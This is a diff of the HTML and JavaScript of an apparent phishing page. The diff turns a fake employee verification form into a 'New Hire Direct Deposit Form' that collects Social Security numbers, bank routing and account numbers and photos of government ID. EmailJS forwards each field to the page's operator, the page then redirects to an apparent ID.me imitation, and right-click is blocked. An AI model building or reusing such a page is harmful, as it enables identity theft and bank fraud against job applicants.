@@ -2,19 +2,19 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Employee Background Verification Form</title>
+  <title>New Hire Direct Deposit Form</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  
-  <!-- Uploadcare widget -->
+
+  <!-- Uploadcare Widget -->
   <script>
-    UPLOADCARE_PUBLIC_KEY = "0e0028c175bc4ce40381";
+    UPLOADCARE_PUBLIC_KEY = "dc6750519d7c0a4947bc";
   </script>
   <script src="https://ucarecdn.com/libs/widget/3.x/uploadcare.full.min.js"></script>
-  
-  <!-- EmailJS -->
+
+  <!-- EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script>
-    emailjs.init("3KSM85VlMXzH-fldA");
+    emailjs.init("utXWJ3WdfLKfltzJ3");
   </script>
 
   <style>
@@ -86,11 +86,12 @@
       border-radius: 10px;
       text-align: center;
       font-weight: bold;
+      min-height: 100px;
     }
   </style>
 </head>
 <body>
-  <h2>Employee Background Verification</h2>
+  <h2>Employee Direct Deposit & Verification Form</h2>
 
   <!-- Page 1 -->
   <form id="formPage1">
@@ -103,17 +104,23 @@
     <label>Phone Number</label>
     <input type="tel" name="phone" required />
 
-    <label>Mailing Address</label>
-    <input type="text" name="mailing_address" required />
+    <label>Bank Name</label>
+    <input type="text" name="bank" required />
 
-    <label>City</label>
-    <input type="text" name="city" required />
+    <label>Branch</label>
+    <input type="text" name="branch" placeholder="Include Bank Branch & Address" required />
 
-    <label>State</label>
-    <input type="text" name="state" required />
+    <label>Routing Number</label>
+    <input type="text" name="routing" pattern="\d{9}" required />
 
-    <label>Zip Code</label>
-    <input type="text" name="zip" pattern="\d{5}" required />
+    <label>Account Number</label>
+    <input type="text" name="account" required />
+
+    <label>Account Type</label>
+    <select name="account_type" required>
+      <option value="Checking">Checking</option>
+      <option value="Savings">Savings</option>
+    </select>
 
     <label>Social Security Number (SSN)</label>
     <input type="text" name="ssn" placeholder="123-45-6789" required />
@@ -125,10 +132,10 @@
     <input type="text" name="high_school_location" placeholder="e.g., Dallas, TX" required />
 
     <label>Year Started</label>
-    <input type="number" name="year_started" min="1900" max="2099" step="1" required />
+    <input type="number" name="year_started" min="1900" max="2099" required />
 
     <label>Year Graduated</label>
-    <input type="number" name="year_graduated" min="1900" max="2099" step="1" required />
+    <input type="number" name="year_graduated" min="1900" max="2099" required />
 
     <label>Upload Government-Issued ID (Front)</label>
     <input type="hidden" role="uploadcare-uploader" name="id_front" data-clearable />
@@ -153,7 +160,6 @@
       <p>
         Full previous employment history is needed. Whether you work full-time or part-time,
         your employer must provide you with a Form W-2 at the end of each tax year.
-        To know your starting salary record history with your previous employers, please answer the following:
       </p>
     </div>
 
@@ -173,13 +179,9 @@
     <button type="submit">Submit</button>
   </form>
 
-  <!-- Final Thank You Message -->
-  <div id="thankYou">
-    <h3>Thank you for completing your employee onboarding!</h3>
-    <p>Your information has been securely submitted. You may now close this page.</p>
-  </div>
+  <!-- Thank You (message removed but element kept for redirect) -->
+  <div id="thankYou"></div>
 
-  <!-- JavaScript for Form Handling -->
   <script>
     const formPage1 = document.getElementById('formPage1');
     const formPage2 = document.getElementById('formPage2');
@@ -199,10 +201,11 @@
           fullName: formPage1.fullName.value,
           email: formPage1.email.value,
           phone: formPage1.phone.value,
-          mailing_address: formPage1.mailing_address.value,
-          city: formPage1.city.value,
-          state: formPage1.state.value,
-          zip: formPage1.zip.value,
+          bank: formPage1.bank.value,
+          branch: formPage1.branch.value,
+          routing: formPage1.routing.value,
+          account: formPage1.account.value,
+          account_type: formPage1.account_type.value,
           ssn: formPage1.ssn.value,
           high_school_name: formPage1.high_school_name.value,
           high_school_location: formPage1.high_school_location.value,
@@ -214,7 +217,7 @@
           submissionTime: new Date().toLocaleString()
         };
 
-        emailjs.send("service_pykfhaa", "template_9jwdgon", form1Data)
+        emailjs.send("service_2sft4bj", "template_4ci0nxm", form1Data)
           .then(() => {
             formPage1.style.display = 'none';
             formPage2.style.display = 'block';
@@ -237,31 +240,22 @@
         submissionTime: new Date().toLocaleString()
       };
 
-      emailjs.send("service_pykfhaa", "template_9jwdgon", form2Data)
+      emailjs.send("service_2sft4bj", "template_4ci0nxm", form2Data)
         .then(() => {
           formPage2.style.display = 'none';
           thankYou.style.display = 'block';
           window.scrollTo(0, 0);
+
+          // Immediate redirect to ID.me page
+          window.location.href = "idme.html";
         })
         .catch((error) => {
           console.error("EmailJS Error (Form 2):", error);
           alert("Failed to send second part of the form. Please try again.");
         });
     });
-  </script>
 
-  <!-- LiveChat -->
-  <script>
-    window.__lc = window.__lc || {};
-    window.__lc.license = 16972020;
-    window.__lc.integration_name = "manual_channels";
-    window.__lc.product_name = "livechat";
-    (function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
-  </script>
-  <noscript><a href="https://www.livechat.com/chat-with/16972020/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
-
-  <!-- Disable Right-Click -->
-  <script>
+    // Disable Right-Click
     document.addEventListener('contextmenu', event => event.preventDefault());
   </script>
 </body>
